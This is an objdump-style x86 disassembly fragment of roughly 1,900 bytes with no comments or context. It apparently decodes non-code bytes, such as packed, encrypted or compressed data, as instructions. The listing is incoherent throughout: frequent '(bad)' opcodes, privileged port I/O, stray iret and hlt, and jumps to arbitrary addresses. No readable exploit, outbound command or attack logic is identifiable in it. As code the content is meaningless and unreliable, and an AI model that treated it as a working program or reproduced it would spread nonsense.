  4117dc:	mov    ecx,0xf72ab57e
  4117e1:	(bad)  
  4117e2:	sub    bl,BYTE PTR [esi+0x4ea72fae]
  4117e8:	mov    ebp,0x3361e937
  4117ed:	std    
  4117ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117ef:	sbb    esi,DWORD PTR [ebx-0x52b3e303]
  4117f5:	xor    BYTE PTR [eax+0x6642b441],ah
  4117fb:	jns    0x411780
  4117fd:	into   
  4117fe:	dec    ebx
  4117ff:	jmp    0x411867
  411801:	iret   
  411802:	jl     0x4117c4
  411804:	add    DWORD PTR [edi],esp
  411806:	iret   
  411807:	addr16 enter 0x6b73,0xfa
  41180c:	pop    esp
  41180d:	lods   al,BYTE PTR ds:[esi]
  41180e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41180f:	pop    ebp
  411810:	(bad)  
  411811:	mov    eax,0x16a43af9
  411816:	xchg   ebx,eax
  411817:	popf   
  411818:	sub    al,0x9e
  41181a:	and    eax,DWORD PTR [ebp+0x7122a8d8]
  411820:	inc    ebp
  411821:	add    al,0xf6
  411823:	pop    ds
  411824:	jmp    0x411851
  411826:	xor    BYTE PTR [ecx+0x35ba7ac],bl
  41182c:	sub    eax,0x8eb00987
  411831:	(bad)  
  411832:	cld    
  411833:	out    0xfd,eax
  411835:	fisubr WORD PTR [esp+ebx*8+0x66]
  411839:	pushf  
  41183a:	mov    cl,0x50
  41183c:	add    DWORD PTR [edi+0x74],ebx
  41183f:	dec    edi
  411840:	test   DWORD PTR [eax+0x3604e65e],ebx
  411846:	call   0x98f6de7f
  41184b:	out    0xbf,al
  41184d:	cmc    
  41184e:	loop   0x4118c2
  411850:	sbb    BYTE PTR [eax-0x5],bl
  411853:	push   esi
  411854:	mov    al,0xdd
  411856:	push   ebx
  411857:	pop    es
  411858:	xor    esp,edi
  41185a:	mov    DWORD PTR [edi-0x5b],ebx
  41185d:	cs sbb eax,0x108e1216
  411863:	cld    
  411864:	gs mov ah,0xc6
  411867:	pushf  
  411868:	inc    edx
  411869:	bnd jmp 0xb879e1fe
  41186f:	cs aam 0x14
  411872:	xchg   edx,eax
  411873:	jns    0x41187d
  411875:	jmp    0x4118ac
  411877:	stos   DWORD PTR es:[edi],eax
  411878:	cli    
  411879:	mov    ds:0x1e6a7dfc,eax
  41187e:	dec    edi
  41187f:	sub    ch,dl
  411881:	or     cl,bl
  411883:	jns    0x41187f
  411885:	jno    0x41182a
  411887:	cmp    BYTE PTR [eax+0x10946a46],al
  41188d:	cmp    al,0xb0
  41188f:	xor    al,0x6e
  411891:	xchg   BYTE PTR ds:0xbfe7947,ch
  411897:	cmp    dh,dl
  411899:	sbb    al,BYTE PTR [ebp-0x49eb02b6]
  41189f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118a0:	push   ebp
  4118a1:	pop    esi
  4118a2:	push   edx
  4118a3:	jg     0x41190b
  4118a5:	add    eax,ebx
  4118a7:	loopne 0x4118c1
  4118a9:	int3   
  4118aa:	fld    DWORD PTR [ebx]
  4118ac:	aaa    
  4118ad:	or     cl,BYTE PTR [eax-0x24]
  4118b0:	add    DWORD PTR [eax-0x1274eba7],esi
  4118b6:	or     eax,0xffc8503a
  4118bb:	(bad)  
  4118bc:	out    dx,eax
  4118bd:	stos   DWORD PTR es:[edi],eax
  4118be:	loope  0x4118d8
  4118c0:	sub    eax,0xa2c29222
  4118c5:	sbb    cl,bh
  4118c7:	dec    eax
  4118c8:	clc    
  4118c9:	dec    BYTE PTR [edx-0x67]
  4118cc:	rcl    BYTE PTR [ecx],0x32
  4118cf:	popa   
  4118d0:	add    al,0xdf
  4118d2:	daa    
  4118d3:	fwait
  4118d4:	push   eax
  4118d5:	mov    ah,BYTE PTR [eax+0x2ef4d638]
  4118db:	retf   
  4118dc:	mov    ah,0x53
  4118de:	push   eax
  4118df:	idiv   esi
  4118e1:	add    eax,0x231590af
  4118e6:	ror    DWORD PTR [ecx],1
  4118e8:	enter  0x7571,0x54
  4118ec:	fidivr DWORD PTR ds:0x99f97e62
  4118f2:	in     eax,dx
  4118f3:	stos   DWORD PTR es:[edi],eax
  4118f4:	mov    dh,0xfc
  4118f6:	mov    al,ds:0x589f34bd
  4118fb:	pushf  
  4118fc:	dec    ebp
  4118fd:	outs   dx,BYTE PTR ds:[esi]
  4118fe:	inc    ecx
  4118ff:	lds    ecx,FWORD PTR [edx+0xebf6bc9]
  411905:	scas   eax,DWORD PTR es:[edi]
  411906:	enter  0x14c6,0x8f
  41190a:	mov    gs,WORD PTR [edx+ecx*8-0x67]
  41190e:	xchg   esi,eax
  41190f:	sbb    eax,0xda1d73d7
  411914:	rcr    DWORD PTR [edi],cl
  411916:	mov    ds:0x6b5c7048,eax
  41191b:	stos   DWORD PTR es:[edi],eax
  41191c:	push   ebx
  41191d:	cmp    BYTE PTR [edi-0x9cf0ac],al
  411923:	cmp    DWORD PTR [eax-0x1d],ebp
  411926:	xchg   esp,eax
  411927:	mov    ah,0x91
  411929:	test   eax,0xe1169eee
  41192e:	jbe    0x4118c4
  411930:	out    dx,al
  411931:	pop    ecx
  411932:	mov    gs,eax
  411934:	pop    ebx
  411935:	pushf  
  411936:	pop    ss
  411937:	sub    BYTE PTR [ebp-0xcd7aff7],0x32
  41193e:	in     al,0x6f
  411940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411941:	aaa    
  411942:	shl    DWORD PTR [edi+0x2c],cl
  411945:	or     esi,0xa92f7dd6
  41194b:	fstp   DWORD PTR [ecx+ebx*1+0x57]
  41194f:	xchg   ecx,eax
  411950:	jge    0x41192d
  411952:	pop    ss
  411953:	and    eax,DWORD PTR [ebx+0x1044362c]
  411959:	mov    dl,0xff
  41195b:	push   0x2b
  41195d:	rcr    BYTE PTR [edx-0x5c],1
  411960:	xor    cl,ah
  411962:	cmp    eax,0x64e32ee8
  411967:	sahf   
  411968:	dec    edx
  411969:	inc    esp
  41196a:	in     eax,dx
  41196b:	mov    ecx,0xb66f53bf
  411970:	out    dx,eax
  411971:	add    ah,BYTE PTR [edx-0x61]
  411974:	sbb    BYTE PTR [eax+0x6cd5fe16],cl
  41197a:	cmp    DWORD PTR [ebx+0x1f],eax
  41197d:	jg     0x41194e
  41197f:	sti    
  411980:	sub    DWORD PTR [esi-0x694b3405],edi
  411986:	mov    ds:0x6bf5c0b8,al
  41198b:	fcmovne st,st(5)
  41198d:	xchg   ecx,eax
  41198e:	loop   0x41195b
  411990:	mov    edi,0xa052aa95
  411995:	adc    al,0xa8
  411997:	push   ebp
  411998:	ja     0x411a15
  41199a:	sbb    BYTE PTR [edx-0x495b417e],ah
  4119a0:	mov    esp,DWORD PTR [edx+0x6f]
  4119a3:	ficomp WORD PTR [eax]
  4119a5:	(bad)  
  4119a6:	call   0x5b8c0bda
  4119ab:	loope  0x411931
  4119ad:	sub    BYTE PTR [ecx-0x17],ch
  4119b0:	xchg   edi,esi
  4119b2:	fwait
  4119b3:	(bad)  
  4119b4:	mov    esp,0xc3c52bf6
  4119b9:	inc    ebx
  4119ba:	cmp    eax,0xc335bba1
  4119bf:	in     al,dx
  4119c0:	mov    eax,ds:0x924f547d
  4119c5:	add    DWORD PTR [edx+0x60],esp
  4119c8:	mov    DWORD PTR [edi],ecx
  4119ca:	dec    esp
  4119cb:	xchg   BYTE PTR [ecx+0x5412f04a],ah
  4119d1:	or     eax,DWORD PTR [eax]
  4119d3:	(bad)  
  4119d4:	xchg   ebp,eax
  4119d5:	jmp    0xd1a77d39
  4119da:	aaa    
  4119db:	mov    es,WORD PTR [ebp+0x2d237c3d]
  4119e1:	mov    ah,0x11
  4119e3:	jo     0x41199a
  4119e5:	mov    bl,0x46
  4119e7:	std    
  4119e8:	shl    esp,0xca
  4119eb:	sti    
  4119ec:	stos   DWORD PTR es:[edi],eax
  4119ed:	fisubr WORD PTR [ecx+0x333719a1]
  4119f3:	fdiv   QWORD PTR [edi+0x9]
  4119f6:	and    ebx,ecx
  4119f8:	or     eax,0x9a324c1c
  4119fd:	and    bl,BYTE PTR [eax]
  4119ff:	pmulhuw mm2,QWORD PTR [ebx+ebx*8+0x73f390e7]
  411a07:	popf   
  411a08:	pop    DWORD PTR [eax+0x113198c6]
  411a0e:	out    dx,eax
  411a0f:	fst    DWORD PTR [ebx]
  411a11:	inc    ebx
  411a12:	add    al,0xc8
  411a14:	jne    0x4119e0
  411a16:	push   ds
  411a17:	xor    DWORD PTR [esi],0xde846fa
  411a1d:	mov    cl,0x4e
  411a1f:	movntq QWORD PTR [ebx+0x4],mm7
  411a23:	or     DWORD PTR [esi],edx
  411a25:	mov    eax,0x8c20b253
  411a2a:	or     al,0xb1
  411a2c:	mov    ebp,0xa6567862
  411a31:	(bad)  
  411a32:	jecxz  0x4119f6
  411a34:	jp     0x411a33
  411a36:	mov    bh,0x45
  411a38:	das    
  411a39:	inc    ebx
  411a3a:	aaa    
  411a3b:	pushf  
  411a3c:	test   al,0x5c
  411a3e:	aas    
  411a3f:	push   0xe103d703
  411a44:	bnd jns 0x411a72
  411a47:	cmc    
  411a48:	cmp    al,0xf5
  411a4a:	xor    ebp,ebx
  411a4c:	fst    st(2)
  411a4e:	cld    
  411a4f:	xchg   esp,eax
  411a50:	sbb    DWORD PTR [eax],ebp
  411a52:	repnz ss stos DWORD PTR es:[edi],eax
  411a55:	outs   dx,DWORD PTR ds:[esi]
  411a56:	push   esp
  411a57:	sub    al,0x80
  411a59:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  411a5b:	mov    edi,0x9ff3dd5a
  411a60:	inc    edi
  411a61:	cmp    edx,DWORD PTR [ebx]
  411a63:	mov    esi,0x7fb50dc7
  411a68:	jecxz  0x411a71
  411a6a:	ins    DWORD PTR es:[edi],dx
  411a6b:	in     eax,dx
  411a6c:	mov    edx,0x6272afc8
  411a71:	push   eax
  411a72:	scas   al,BYTE PTR es:[edi]
  411a73:	sub    BYTE PTR ds:0x57ffc25d,bl
  411a79:	sub    DWORD PTR [edx+0x7c2d9b59],ebx
  411a7f:	js     0x411a11
  411a81:	or     BYTE PTR [eax],0xb4
  411a84:	out    0x9e,eax
  411a86:	fs jo  0x411ad5
  411a89:	mov    ch,ch
  411a8b:	(bad)  
  411a8c:	cmp    DWORD PTR [eax],edx
  411a8e:	sbb    eax,0x5cf78b70
  411a93:	jle    0x411ae9
  411a95:	daa    
  411a96:	pushf  
  411a97:	jle    0x411a6b
  411a99:	and    dl,ch
  411a9b:	sub    eax,0xfde5798b
  411aa0:	arpl   WORD PTR [esi+0x20],ax
  411aa3:	dec    ecx
  411aa4:	fisub  DWORD PTR [esi]
  411aa6:	iret   
  411aa7:	push   eax
  411aa8:	push   eax
  411aa9:	sub    BYTE PTR [edi+eiz*1+0x24],dh
  411aad:	in     eax,dx
  411aae:	inc    ebp
  411aaf:	mov    BYTE PTR [ecx+0x12],dh
  411ab2:	imul   ebx,DWORD PTR [ebx],0x51
  411ab5:	cwde   
  411ab6:	leave  
  411ab7:	mov    BYTE PTR [ebp-0x37],al
  411aba:	(bad)  
  411abd:	fisttp QWORD PTR [eax]
  411abf:	dec    esp
  411ac0:	call   0x793db482
  411ac5:	imul   ebx,DWORD PTR [edx-0x70],0xa261e6cd
  411acc:	fadd   DWORD PTR [ecx]
  411ace:	sti    
  411acf:	xchg   edi,eax
  411ad0:	add    BYTE PTR [esi-0x6e],bh
  411ad3:	iret   
  411ad4:	data16 mov BYTE PTR [esi+0x620355af],bh
  411adb:	dec    esp
  411adc:	fwait
  411add:	dec    ebx
  411ade:	push   ebx
  411adf:	sub    eax,0x2672d51b
  411ae4:	arpl   WORD PTR [esi+0x3b403a25],di
  411aea:	ja     0x411b5a
  411aec:	and    al,0x96
  411aee:	and    edi,esp
  411af0:	out    dx,eax
  411af1:	enter  0x5a55,0x72
  411af5:	xor    eax,0x514ccda8
  411afa:	lock popf 
  411afc:	popa   
  411afd:	scas   eax,DWORD PTR es:[edi]
  411afe:	cdq    
  411aff:	out    dx,al
  411b00:	in     eax,dx
  411b01:	push   esi
  411b02:	(bad)  
  411b03:	jl     0x411b4e
  411b05:	stos   BYTE PTR es:[edi],al
  411b06:	cmc    
  411b07:	mov    bl,0xe1
  411b09:	aaa    
  411b0a:	push   ecx
  411b0b:	lea    esi,[eax]
  411b0d:	mov    eax,ds:0x6518c946
  411b12:	lods   al,BYTE PTR ds:[esi]
  411b13:	out    0x74,al
  411b15:	adc    al,0xb6
  411b17:	add    BYTE PTR [ebp-0x2c2c5b8a],cl
  411b1d:	jne    0x411b28
  411b1f:	sbb    DWORD PTR [eax-0x98cbe1a],esp
  411b25:	aas    
  411b26:	pop    esp
  411b27:	inc    eax
  411b28:	push   edx
  411b29:	mov    DWORD PTR [edi],edi
  411b2b:	xor    eax,0xd9c00d5b
  411b30:	adc    ah,BYTE PTR [edx+0x7486e39f]
  411b36:	pop    edi
  411b37:	xchg   edi,eax
  411b38:	repnz mov ds:0xc59d7ce2,eax
  411b3e:	xchg   edx,eax
  411b3f:	rcr    BYTE PTR [ecx],0x75
  411b42:	xchg   BYTE PTR ds:0xd740323a,bh
  411b48:	shl    BYTE PTR [esi],1
  411b4a:	out    0x33,al
  411b4c:	sbb    BYTE PTR [ebp-0x6b],0xa5
  411b50:	push   cs
  411b51:	mov    edi,0xe26ea8da
  411b56:	lea    ebp,[ebp+0x3d]
  411b59:	retf   0x28b5
  411b5c:	test   eax,0x7bda088e
  411b61:	xchg   ebp,eax
  411b62:	pop    ecx
  411b63:	arpl   WORD PTR [esi+ebp*2+0x27537605],bx
  411b6a:	add    eax,0x673b058d
  411b6f:	sub    esi,eax
  411b71:	or     edi,DWORD PTR [ebp+edi*2-0x69c681f9]
  411b78:	adc    ecx,eax
  411b7a:	retf   
  411b7b:	fdivr  DWORD PTR [edx+0x6c49b78a]
  411b81:	jmp    0x411bba
  411b83:	rcl    cl,1
  411b85:	popa   
  411b86:	fstp   DWORD PTR [ecx+eiz*1+0x16]
  411b8a:	push   es
  411b8b:	jae    0x411b3f
  411b8d:	nop
  411b8e:	push   ss
  411b8f:	fs add al,0xd8
  411b92:	std    
  411b93:	adc    BYTE PTR [eax+0x1a],cl
  411b96:	pop    DWORD PTR [eax-0x6ee8d64d]
  411b9c:	and    ch,BYTE PTR [edx+ecx*4+0x1fecc77b]
  411ba3:	rol    DWORD PTR [ebp+0x23],0xfc
  411ba7:	nop
  411ba8:	arpl   bp,di
  411baa:	inc    edi
  411bab:	cdq    
  411bac:	call   0xab95:0x8fc76d5b
  411bb3:	add    BYTE PTR [eax+eiz*4+0x58],al
  411bb7:	cdq    
  411bb8:	xor    DWORD PTR [ecx-0x16],0xe903bf77
  411bbf:	jmp    0x411bdf
  411bc1:	xchg   DWORD PTR [edi],ecx
  411bc3:	cmp    al,0x71
  411bc5:	or     cl,cl
  411bc7:	xchg   esp,eax
  411bc8:	pop    ebx
  411bc9:	jle    0x411c0c
  411bcb:	mov    ebp,0x2d385c46
  411bd0:	popa   
  411bd1:	fld    QWORD PTR [ebx-0x22358997]
  411bd7:	push   eax
  411bd8:	rol    dl,0x8c
  411bdb:	cmp    bh,BYTE PTR [edx+0x50]
  411bde:	mov    ebx,0xece1fdd9
  411be3:	or     al,0x7f
  411be5:	push   esi
  411be6:	sub    al,0x17
  411be8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411be9:	cmp    eax,0x413d8cf7
  411bee:	and    BYTE PTR [edx],0x39
  411bf1:	mov    esp,0x59d9adf2
  411bf6:	aas    
  411bf7:	lods   eax,DWORD PTR ds:[esi]
  411bf8:	cmp    dl,ah
  411bfa:	mov    edx,0xfc0fd169
  411bff:	cdq    
  411c00:	in     al,0xe
  411c02:	aam    0x68
  411c04:	sti    
  411c05:	outs   dx,BYTE PTR ds:[esi]
  411c06:	(bad)  
  411c07:	scas   eax,DWORD PTR es:[edi]
  411c08:	sub    DWORD PTR [ebx],esi
  411c0a:	jle    0x411bda
  411c0c:	pushf  
  411c0d:	test   BYTE PTR [ebx],ah
  411c0f:	mov    al,ds:0xfa44b954
  411c14:	aad    0x5f
  411c16:	out    dx,eax
  411c17:	(bad)  
  411c18:	rcr    DWORD PTR [esi],1
  411c1a:	test   al,0xb
  411c1c:	outs   dx,BYTE PTR ds:[esi]
  411c1d:	mov    ds:0x8d49c0c8,al
  411c22:	mov    bh,0xd
  411c24:	idiv   DWORD PTR [ecx+0x73]
  411c27:	mov    ds:0x2250b566,al
  411c2c:	jne    0x411bfb
  411c2e:	leave  
  411c2f:	fst    QWORD PTR [ecx+0x6a3e9649]
  411c35:	mov    DWORD PTR [eax-0xa],ebx
  411c38:	imul   ebx,DWORD PTR [ebx],0x96fdc5dc
  411c3e:	adc    edi,DWORD PTR [edx+0x2e95f80f]
  411c44:	jbe    0x411c76
  411c46:	cs cmp al,0xf1
  411c49:	pop    esi
  411c4a:	daa    
  411c4b:	jmp    0xc867ccff
  411c50:	shl    BYTE PTR [ebx-0x2c0ad805],0x27
  411c57:	repz dec eax
  411c59:	cmc    
  411c5a:	pusha  
  411c5b:	mov    edx,ecx
  411c5d:	cmp    BYTE PTR [edi-0x7e],al
  411c60:	dec    esi
  411c61:	inc    eax
  411c62:	fcomp  st(7)
  411c64:	mov    bl,0x6a
  411c66:	ds in  eax,0xf0
  411c69:	push   ss
  411c6a:	inc    eax
  411c6b:	pushf  
  411c6c:	jo     0x411c3c
  411c6e:	nop
  411c6f:	inc    ebx
  411c70:	inc    ecx
  411c71:	cdq    
  411c72:	pop    ss
  411c73:	das    
  411c74:	clc    
  411c75:	add    dl,ah
  411c77:	stos   DWORD PTR es:[edi],eax
  411c78:	cwde   
  411c79:	pop    ss
  411c7a:	sub    eax,0x4c38a0b3
  411c7f:	push   esp
  411c80:	pusha  
  411c81:	or     DWORD PTR [edx],ebp
  411c83:	pusha  
  411c84:	into   
  411c85:	shl    ebp,0x57
  411c88:	push   esp
  411c89:	pop    ecx
  411c8a:	xchg   esi,eax
  411c8b:	outs   dx,BYTE PTR ds:[esi]
  411c8c:	outs   dx,DWORD PTR es:[esi]
  411c8e:	pop    edx
  411c8f:	push   ss
  411c90:	imul   esp,DWORD PTR [eax],0x96d78e1e
  411c96:	xor    al,0x11
  411c98:	push   cs
  411c99:	or     bh,BYTE PTR [ecx-0x73]
  411c9c:	(bad)  
  411c9e:	shr    DWORD PTR [esi-0x5b],cl
  411ca1:	stc    
  411ca2:	mov    ebx,0x997bb41
  411ca7:	cli    
  411ca8:	fs and eax,0xe4953344
  411cae:	cmp    eax,0x6e87f036
  411cb3:	jns    0x411cb3
  411cb5:	loop   0x411cd6
  411cb7:	jno    0x411d0a
  411cb9:	loope  0x411d2c
  411cbb:	inc    edi
  411cbc:	sbb    bh,BYTE PTR [eax-0x24]
  411cbf:	out    dx,eax
  411cc0:	dec    esp
  411cc1:	sbb    dl,BYTE PTR [ecx+ebx*2]
  411cc4:	mov    cl,0x45
  411cc6:	mov    edx,0x2bd77622
  411ccb:	aam    0xfd
  411ccd:	jb     0x411cdb
  411ccf:	rcl    BYTE PTR [ecx*8-0x3aba1ca4],0x3e
  411cd7:	call   0x3a89:0xf5924dfc
  411cde:	mov    al,BYTE PTR [ebx]
  411ce0:	lea    eax,ds:0x8e13fa24
  411ce6:	jae    0x411cf4
  411ce8:	in     eax,dx
  411ce9:	fidiv  WORD PTR [edi-0x63]
  411cec:	jecxz  0x411d6d
  411cee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cef:	and    cl,BYTE PTR [edx-0x63ec481d]
  411cf5:	add    DWORD PTR [esi+esi*8-0x5b],ecx
  411cf9:	push   edi
  411cfa:	enter  0xad6b,0x17
  411cfe:	retf   0x8c91
  411d01:	mov    edx,ecx
  411d03:	fbstp  TBYTE PTR [ebp-0x659cc432]
  411d09:	sub    BYTE PTR [ebp-0x5d0bf0b9],dl
  411d0f:	sbb    ecx,DWORD PTR [ebx-0x2bb600e0]
  411d15:	lahf   
  411d16:	in     eax,0x58
  411d18:	push   cs
  411d19:	aad    0x23
  411d1b:	pusha  
  411d1c:	les    edi,FWORD PTR [ecx+0x5c254b69]
  411d22:	add    edi,DWORD PTR [eax+0xcadb3cd]
  411d28:	je     0x411d04
  411d2a:	stc    
  411d2b:	test   DWORD PTR [eax-0x2dccddc],esi
  411d31:	(bad)  
  411d32:	pop    es
  411d33:	in     al,dx
  411d34:	retf   
  411d35:	adc    bl,0x1d
  411d38:	inc    edx
  411d39:	outs   dx,DWORD PTR ds:[esi]
  411d3a:	xchg   esp,eax
  411d3b:	or     esp,edi
  411d3d:	in     al,dx
  411d3e:	cld    
  411d3f:	sub    bh,al
  411d41:	sub    esp,ecx
  411d43:	xchg   ecx,eax
  411d44:	(bad)  
  411d45:	mov    ss,WORD PTR [eax-0x2]
  411d48:	out    0xbf,eax
  411d4a:	sub    eax,0x884d5e3
  411d4f:	jecxz  0x411d8f
  411d51:	(bad)  
  411d52:	lods   al,BYTE PTR ds:[esi]
  411d53:	(bad)  
  411d54:	(bad)  
  411d55:	int    0x13
  411d57:	stc    
  411d58:	out    dx,eax
  411d59:	add    dh,BYTE PTR [edi+0x68]
  411d5c:	xlat   BYTE PTR ds:[ebx]
  411d5d:	add    al,0x9d
  411d5f:	iret   
  411d60:	mov    ds,WORD PTR [edx]
  411d62:	imul   esp,DWORD PTR [edx-0x1f],0x16e6122f
  411d69:	pop    esi
  411d6a:	ins    BYTE PTR es:[edi],dx
  411d6b:	or     eax,0x80a89a62
  411d70:	and    al,0x38
  411d72:	stos   DWORD PTR es:[edi],eax
  411d73:	xlat   BYTE PTR ds:[ebx]
  411d74:	push   ds
  411d75:	lds    ebp,FWORD PTR [ecx]
  411d77:	cdq    
  411d78:	mov    ch,0x53
  411d7a:	pop    es
  411d7b:	add    al,0x30
  411d7d:	push   cs
  411d7e:	cmp    DWORD PTR [edi*1-0x5be00da4],0x2b
  411d86:	mov    eax,ds:0xeedf7418
  411d8b:	mov    ah,0xc4
  411d8d:	and    eax,eax
  411d8f:	cmp    al,0x8c
  411d91:	xchg   ebx,ebp
  411d93:	mov    dh,0x9d
  411d95:	sub    dl,BYTE PTR [edx]
  411d97:	push   eax
  411d98:	xor    BYTE PTR [esi],bh
  411d9a:	and    BYTE PTR [ebx],al
  411d9c:	mov    esi,eax
  411d9e:	inc    ecx
  411d9f:	(bad)  
  411da0:	adc    al,0x9c
  411da2:	popa   
  411da3:	cwde   
  411da4:	cmp    eax,0xb0869d4d
  411da9:	push   esi
  411daa:	test   DWORD PTR ss:[ebx+0x2d],edx
  411dae:	fwait
  411daf:	clc    
  411db0:	sub    edi,DWORD PTR [esi+0x6abdfc10]
  411db6:	mov    ecx,0xc4ef2620
  411dbb:	out    dx,eax
  411dbc:	pop    es
  411dbd:	add    DWORD PTR [eax+0x6b],eax
  411dc0:	pop    ss
  411dc1:	push   ds
  411dc2:	mov    dh,0x23
  411dc4:	pop    ss
  411dc5:	lods   al,BYTE PTR ds:[esi]
  411dc6:	mov    dh,0xe5
  411dc8:	iret   
  411dc9:	data16 mov al,ds:0xea76fc38
  411dcf:	adc    bh,BYTE PTR [ebx+0x3ebb9e34]
  411dd5:	inc    ecx
  411dd6:	mov    es,WORD PTR [esi]
  411dd8:	outs   dx,BYTE PTR ds:[esi]
  411dd9:	in     al,0x20
  411ddb:	arpl   WORD PTR [esi+esi*8-0xf12d8d0],bp
  411de2:	outs   dx,BYTE PTR ds:[esi]
  411de3:	das    
  411de4:	or     ah,bh
  411de6:	push   eax
  411de7:	jae    0x411e34
  411de9:	mov    bh,0xea
  411deb:	popf   
  411dec:	int    0x66
  411dee:	fnstcw WORD PTR [esi+0x1a]
  411df1:	and    ebp,DWORD PTR [edi+0x5a]
  411df4:	addr16 popa 
  411df6:	mov    al,ds:0xc89c25eb
  411dfb:	lea    edi,[esi-0x7516afce]
  411e01:	rol    DWORD PTR [esi-0x7c0fdc43],1
  411e07:	dec    ecx
  411e08:	add    eax,0x6074e580
  411e0d:	xor    al,0x3
  411e0f:	sti    
  411e10:	sub    BYTE PTR [edx+ebx*8],cl
  411e13:	rcr    BYTE PTR [ebp-0x54],cl
  411e16:	pushf  
  411e17:	xchg   edi,eax
  411e18:	mov    ebp,0xd82feed4
  411e1d:	jne    0x411e58
  411e1f:	xor    edx,DWORD PTR [eax]
  411e21:	dec    edi
  411e22:	sub    eax,0x677fec78
  411e27:	or     dl,BYTE PTR [esp+ebp*4+0x1e]
  411e2b:	pop    eax
  411e2c:	mov    esi,0xfd401b4d
  411e31:	cmc    
  411e32:	inc    ebp
  411e33:	call   eax
  411e35:	test   al,0x88
  411e37:	dec    ecx
  411e38:	arpl   WORD PTR [edx-0x6e],cx
  411e3b:	sub    DWORD PTR [ecx],0x4a
  411e3e:	stc    
  411e3f:	jo     0x411dcf
  411e41:	mov    ds:0x59103161,al
  411e46:	inc    edx
  411e47:	mov    ebx,0xbc27e3ce
  411e4c:	xlat   BYTE PTR ds:[ebx]
  411e4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e4e:	sub    edi,DWORD PTR [esi+0x34cfb359]
  411e54:	mov    ebx,0xe0ba83b
  411e59:	dec    ebx
  411e5a:	dec    edi
  411e5b:	xor    al,0xc1
  411e5d:	out    0xcc,eax
  411e5f:	lods   eax,DWORD PTR ds:[esi]
  411e60:	shl    ch,1
  411e62:	xchg   edx,eax
  411e63:	or     eax,0x54e68ba5
  411e68:	lods   eax,DWORD PTR ds:[esi]
  411e69:	iret   
  411e6a:	das    
  411e6b:	pop    ss
  411e6c:	shr    BYTE PTR [ebx+0x448e71ad],1
  411e72:	jp     0x411e2c
  411e74:	cmp    eax,0x4b36a96
  411e79:	mov    cs,WORD PTR [edx]
  411e7b:	leave  
  411e7c:	push   esp
  411e7d:	add    al,0x1
  411e7f:	nop
  411e80:	xchg   edi,eax
  411e81:	or     cl,BYTE PTR [esi-0x7e1174df]
  411e87:	push   ebx
  411e88:	loope  0x411e5b
  411e8a:	mov    dl,0xea
  411e8c:	add    al,0xa0
  411e8e:	leave  
  411e8f:	lahf   
  411e90:	and    DWORD PTR [ebx-0x5480f3c2],esi
  411e96:	push   edi
  411e97:	fldcw  WORD PTR [eax+0x603f3eed]
  411e9d:	shr    BYTE PTR [esp+edi*4+0x41],cl
  411ea1:	fiadd  WORD PTR ds:0xebbd4764
  411ea7:	sub    al,BYTE PTR [edi+ebx*2+0x4cde554a]
  411eae:	xor    BYTE PTR [esi-0x4c265ce7],dh
  411eb4:	mov    dl,0x31
  411eb6:	aas    
  411eb7:	sar    BYTE PTR [ecx-0x404d9b21],1
  411ebd:	in     eax,0x6
  411ebf:	pop    ebp
  411ec0:	ss pop es
  411ec2:	inc    ebp
  411ec3:	sub    eax,0x9ce64a84
  411ec8:	lods   al,BYTE PTR ds:[esi]
  411ec9:	push   es
  411eca:	sub    DWORD PTR [eax-0x675084d8],edi
  411ed0:	fldl2t 
  411ed2:	pop    es
  411ed3:	enter  0x1db,0xdc
  411ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ed8:	xor    al,0xd4
  411eda:	pushf  
  411edb:	fist   WORD PTR [eax+0x5]
  411ede:	dec    eax
  411edf:	pushf  
  411ee0:	loope  0x411ecd
  411ee2:	in     eax,dx
  411ee3:	fsubr  DWORD PTR [ebp+0x374c2293]
  411ee9:	shr    BYTE PTR [esi],1
  411eeb:	push   ebp
  411eec:	lock nop
  411eee:	dec    ebp
  411eef:	jb     0x411eaa
  411ef1:	in     al,dx
  411ef2:	xchg   edi,eax
  411ef3:	dec    edi
  411ef4:	leave  
  411ef5:	test   BYTE PTR [ebx-0x1c43f3cb],dl
  411efb:	sbb    al,0x1a
  411efd:	aam    0x9
  411eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f00:	rcl    BYTE PTR [esi],0x50
  411f03:	scas   eax,DWORD PTR es:[edi]
  411f04:	cs xchg ebp,eax
  411f06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f07:	nop
  411f08:	sub    DWORD PTR [eax+0x1b],esp
  411f0b:	test   eax,0x294879bd
  411f10:	cmp    bh,BYTE PTR [eax-0x6a367ab6]
  411f16:	shr    ch,cl
  411f18:	pop    edx
  411f19:	cmp    esi,DWORD PTR [ecx+0x78f8db67]
  411f1f:	or     eax,0xf064c336
  411f24:	stos   BYTE PTR es:[edi],al
  411f25:	popf   
  411f26:	popa   
  411f27:	std    
  411f28:	fisubr DWORD PTR [eax+0x2a03eb7c]
  411f2e:	adc    BYTE PTR [eax+ecx*8+0x72957bfb],cl
  411f35:	loope  0x411f26
  411f37:	xor    cl,dh
  411f39:	(bad)  
  411f3a:	fidiv  DWORD PTR [ecx-0x32]
  411f3d:	stos   DWORD PTR es:[edi],eax
  411f3e:	hlt    
  411f3f:	jns    0x411f00
  411f41:	jbe    0x411fab
  411f43:	fldenv [edx]
  411f45:	jb     0x411f06
  411f47:	(bad)  
  411f48:	mov    ah,0xbc
  411f4a:	or     BYTE PTR [edx+0x62],al
  411f4d:	lahf   
  411f4e:	aam    0x41
  411f50:	jns    0x411f58
  411f52:	inc    ebx
  411f53:	out    dx,al
  411f54:	adc    DWORD PTR [eax-0x6dbca23b],0x31f46440
  411f5e:	scas   al,BYTE PTR es:[edi]
  411f5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f60:	test   BYTE PTR [ecx],bh
  411f62:	stos   BYTE PTR es:[edi],al
  411f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f64:	add    BYTE PTR [ecx+0x5df19a22],0x91
  411f6b:	sub    edx,eax
  411f6d:	push   ebx
  411f6e:	inc    edx
